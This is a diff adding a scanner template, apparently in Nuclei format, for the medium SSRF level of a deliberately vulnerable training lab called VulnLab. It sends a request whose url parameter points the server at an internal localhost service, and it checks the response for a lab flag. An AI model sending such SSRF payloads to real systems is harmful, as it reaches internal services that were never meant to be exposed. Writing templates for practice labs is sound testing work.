@@ -1,0 +1,22 @@
+id: vulnlab-ssrf-medium
+
+info:
+  name: VulnLab SSRF medium 档（localhost 等价写法）
+  author: hediwen
+  severity: high
+  tags: vulnlab,ssrf
+
+http:
+  - raw:
+      - |
+        GET /ssrf/medium.php?url=http%3A%2F%2Flocalhost%3A8090%2Finternal%2Finner-service.php HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        part: body
+        words:
+          - "VULNLAB{ssrf_reached_internal_service}"
+
